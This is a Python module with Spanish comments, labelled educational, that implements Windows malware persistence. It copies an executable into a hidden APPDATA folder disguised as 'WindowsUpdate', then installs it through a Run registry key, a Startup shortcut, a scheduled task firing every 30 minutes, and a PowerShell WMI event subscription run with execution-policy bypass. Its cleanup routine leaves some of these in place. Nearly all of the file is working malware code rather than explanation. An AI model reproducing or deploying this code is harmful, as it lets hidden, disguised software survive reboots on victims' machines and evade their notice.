"""
Módulo de persistencia - Técnicas de mantenimiento de acceso
Propósito educativo: Entender cómo el malware mantiene persistencia
"""

import os
import sys
import shutil
import subprocess
import winreg as reg
import ctypes
from pathlib import Path


class PersistenceManager:
    """
    Clase 2: Gestión de persistencia en el sistema
    Implementa múltiples técnicas de persistencia usadas por malware real
    """
    
    def __init__(self, executable_path=None):
        self.executable_path = executable_path or sys.executable
        self.appdata = os.getenv('APPDATA')
        self.startup_folder = os.path.join(
            self.appdata, 
            r'Microsoft\Windows\Start Menu\Programs\Startup'
        )
        self.install_path = os.path.join(
            self.appdata, 
            'WindowsUpdate',  # Nombre disfrazado
            'update.exe'
        )
    
    def install(self):
        """
        Instala el payload en ubicación persistente
        """
        try:
            # Crear directorio
            install_dir = os.path.dirname(self.install_path)
            os.makedirs(install_dir, exist_ok=True)
            
            # Copiar ejecutable
            if not os.path.exists(self.install_path):
                shutil.copy2(self.executable_path, self.install_path)
                
                # Atributos ocultos
                ctypes.windll.kernel32.SetFileAttributesW(
                    self.install_path, 0x02
                )
                ctypes.windll.kernel32.SetFileAttributesW(
                    install_dir, 0x02
                )
            
            return True
        except Exception as e:
            return False
    
    def registry_persistence(self):
        """
        Técnica 1: Clave de ejecución en registro (Run/RunOnce)
        """
        try:
            # HKCU\Software\Microsoft\Windows\CurrentVersion\Run
            key_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
            
            with reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, 
                           reg.KEY_WRITE) as key:
                reg.SetValueEx(
                    key, 
                    'WindowsUpdate',  # Nombre disfrazado
                    0, 
                    reg.REG_SZ, 
                    f'"{self.install_path}"'
                )
            return True
        except:
            return False
    
    def startup_folder_persistence(self):
        """
        Técnica 2: Carpeta de inicio
        """
        try:
            startup_path = os.path.join(
                self.startup_folder,
                'update.lnk'  # Acceso directo
            )
            
            # Crear acceso directo (WScript)
            vbs_script = f'''
Set WshShell = CreateObject("WScript.Shell")
Set oLink = WshShell.CreateShortcut("{startup_path}")
oLink.TargetPath = "{self.install_path}"
oLink.WorkingDirectory = "{os.path.dirname(self.install_path)}"
oLink.IconLocation = "shell32.dll, 14"
oLink.Save
            '''
            
            temp_vbs = os.path.join(os.getenv('TEMP'), 'create_lnk.vbs')
            with open(temp_vbs, 'w') as f:
                f.write(vbs_script)
            
            subprocess.run(['cscript', '//nologo', temp_vbs], 
                        capture_output=True)
            os.remove(temp_vbs)
            
            return True
        except:
            return False
    
    def scheduled_task_persistence(self):
        """
        Técnica 3: Tarea programada (más sigilosa)
        """
        try:
            task_name = 'WindowsUpdateTask'
            xml_content = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>Windows Update Service</Description>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
    <TimeTrigger>
      <Repetition>
        <Interval>PT30M</Interval>
        <Duration>P1D</Duration>
      </Repetition>
      <StartBoundary>2024-01-01T00:00:00</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Actions Context="Author">
    <Exec>
      <Command>{self.install_path}</Command>
    </Exec>
  </Actions>
</Task>'''
            
            temp_xml = os.path.join(os.getenv('TEMP'), 'task.xml')
            with open(temp_xml, 'w') as f:
                f.write(xml_content)
            
            subprocess.run([
                'schtasks', '/create', '/tn', task_name, 
                '/xml', temp_xml, '/f'
            ], capture_output=True)
            
            os.remove(temp_xml)
            return True
        except:
            return False
    
    def wmi_persistence(self):
        """
        Técnica 4: Event subscription WMI (avanzada)
        """
        try:
            # Crear script WMI
            ps_script = f'''
$filterName = "WindowsUpdateFilter"
$consumerName = "WindowsUpdateConsumer"
$exePath = "{self.install_path}"

# Crear event filter (ejecutar al iniciar Windows)
$filterPath = Set-WmiObject -Class __EventFilter -Namespace "root\subscription" -Arguments @{{
    Name = $filterName
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 320"
}}

# Crear event consumer
$consumerPath = Set-WmiObject -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{{
    Name = $consumerName
    CommandLineTemplate = $exePath
}}

# Vincular filter y consumer
Set-WmiObject -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{{
    Filter = $filterPath
    Consumer = $consumerPath
}}
'''
            
            temp_ps = os.path.join(os.getenv('TEMP'), 'wmi_persist.ps1')
            with open(temp_ps, 'w') as f:
                f.write(ps_script)
            
            subprocess.run([
                'powershell', '-ExecutionPolicy', 'Bypass', 
                '-File', temp_ps
            ], capture_output=True)
            
            os.remove(temp_ps)
            return True
        except:
            return False
    
    def establish_all(self):
        """
        Establece todas las técnicas de persistencia
        """
        self.install()
        
        results = {
            'registry': self.registry_persistence(),
            'startup': self.startup_folder_persistence(),
            'scheduled_task': self.scheduled_task_persistence(),
            'wmi': self.wmi_persistence()
        }
        
        return results
    
    def cleanup(self):
        """
        Limpia persistencia (para limpieza post-análisis)
        """
        try:
            # Eliminar clave de registro
            key_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
            with reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0,
                           reg.KEY_WRITE) as key:
                try:
                    reg.DeleteValue(key, 'WindowsUpdate')
                except:
                    pass
            
            # Eliminar tarea programada
            subprocess.run(['schtasks', '/delete', '/tn', 
                         'WindowsUpdateTask', '/f'], capture_output=True)
            
            # Eliminar archivos
            if os.path.exists(self.install_path):
                os.remove(self.install_path)
            
            return True
        except:
            return False